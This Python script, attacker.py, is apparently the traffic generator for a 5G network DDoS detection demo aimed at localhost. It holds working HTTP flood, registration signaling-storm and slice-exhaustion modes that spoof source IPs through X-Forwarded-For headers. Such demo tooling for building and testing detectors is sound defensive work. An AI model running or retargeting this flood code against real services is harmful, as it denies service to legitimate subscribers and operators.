"""
attacker.py — DDoS Traffic Generator for 5G SBA Demo
Modes: normal | http_flood | signaling_storm | slice_exhaustion

Usage:
    python attacker.py --mode normal
    python attacker.py --mode http_flood
    python attacker.py --mode signaling_storm
    python attacker.py --mode slice_exhaustion
"""

import asyncio
import aiohttp
import argparse
import random
import time
import sys
from collections import deque

BASE_URL = "http://localhost:5000"
ENDPOINTS = [
    {"path": "/ue-registration", "method": "POST"},
    {"path": "/nrf/discover",    "method": "GET"},
    {"path": "/slice/allocate",  "method": "POST"},
]

# FIX: Use a sliding deque of timestamps for accurate rolling req/s display
# (old approach reset counter every 5s, causing display to jump to 0)
_req_timestamps: deque = deque(maxlen=5000)


def generate_fake_ip():
    """Generate a random IPv4 string for X-Forwarded-For spoofing."""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


async def send_request(session, endpoint, fake_ip=None, payload=None):
    """Send one HTTP request; record timestamp on success."""
    url = f"{BASE_URL}{endpoint['path']}"
    headers = {}
    if fake_ip:
        headers['X-Forwarded-For'] = fake_ip

    try:
        if endpoint['method'] == 'POST':
            async with session.post(url, headers=headers, json=payload or {}) as resp:
                await resp.read()
        else:
            async with session.get(url, headers=headers) as resp:
                await resp.read()
        _req_timestamps.append(time.time())
    except Exception:
        pass  # Ignore timeouts / connection refused under heavy load


# ---------------------------------------------------------------------------
# Attack modes
# ---------------------------------------------------------------------------

async def mode_normal():
    """5–10 req/s background traffic with 3 stable source IPs."""
    ips = [generate_fake_ip() for _ in range(3)]
    async with aiohttp.ClientSession() as session:
        while True:
            ip = random.choice(ips)
            endpoint = random.choice(ENDPOINTS)
            asyncio.create_task(send_request(session, endpoint, ip))
            await asyncio.sleep(random.uniform(0.10, 0.20))


async def mode_http_flood():
    """High-volume HTTP Flood across all endpoints (800–1500 req/s).
    Simulates attacker inside SBA network hitting AMF/NRF/SMF simultaneously.
    """
    ips = [generate_fake_ip() for _ in range(50)]
    semaphore = asyncio.Semaphore(200)

    async def worker(session):
        async with semaphore:
            ip = random.choice(ips)
            endpoint = random.choice(ENDPOINTS)
            await send_request(session, endpoint, ip)

    connector = aiohttp.TCPConnector(limit=500)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [asyncio.create_task(worker(session)) for _ in range(200)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.01)


async def mode_signaling_storm():
    """Signaling Storm — floods only /ue-registration (targets AMF).
    Simulates 1000 compromised IoT devices all registering simultaneously.
    Endpoint entropy collapses → IsolationForest detects the skewed distribution.
    """
    endpoint = {"path": "/ue-registration", "method": "POST"}
    semaphore = asyncio.Semaphore(150)

    async def worker(session):
        async with semaphore:
            ue_id = f"UE-{random.randint(10000, 99999)}"
            await send_request(session, endpoint, payload={"ue_id": ue_id})

    connector = aiohttp.TCPConnector(limit=500)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [asyncio.create_task(worker(session)) for _ in range(150)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.05)


async def mode_slice_exhaustion():
    """Slice Exhaustion — floods only /slice/allocate (targets SMF).
    Each request forces a resource-allocation operation; goal is to exhaust
    the available slice pool and deny service to legitimate subscribers.
    """
    endpoint = {"path": "/slice/allocate", "method": "POST"}
    semaphore = asyncio.Semaphore(100)

    async def worker(session):
        async with semaphore:
            await send_request(session, endpoint)

    connector = aiohttp.TCPConnector(limit=500)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [asyncio.create_task(worker(session)) for _ in range(100)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.10)


# ---------------------------------------------------------------------------
# Stats printer — uses sliding window so rate never jumps to 0
# ---------------------------------------------------------------------------

async def print_stats(mode):
    """Print a rolling 5-second req/s rate to the console every second."""
    while True:
        await asyncio.sleep(1)
        now = time.time()
        # Count requests within the last 5 seconds (sliding window)
        recent = sum(1 for t in _req_timestamps if now - t <= 5)
        rate = recent / 5.0
        total = len(_req_timestamps)
        print(f"  [{mode.upper()}] {time.strftime('%H:%M:%S')} | total: {total:>6} | rate: {rate:>7.1f} req/s")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

async def main():
    parser = argparse.ArgumentParser(description="5G SBA DDoS Simulator")
    parser.add_argument(
        '--mode',
        choices=['normal', 'http_flood', 'signaling_storm', 'slice_exhaustion'],
        required=True,
        help="Traffic mode to run"
    )
    args = parser.parse_args()

    print(f"\n  5G DDoS Attacker — mode: {args.mode.upper()}")
    print(f"  Target: {BASE_URL}")
    print("  Press Ctrl+C to stop\n")

    asyncio.create_task(print_stats(args.mode))

    modes = {
        'normal':           mode_normal,
        'http_flood':       mode_http_flood,
        'signaling_storm':  mode_signaling_storm,
        'slice_exhaustion': mode_slice_exhaustion,
    }
    await modes[args.mode]()


if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n  Terminated.")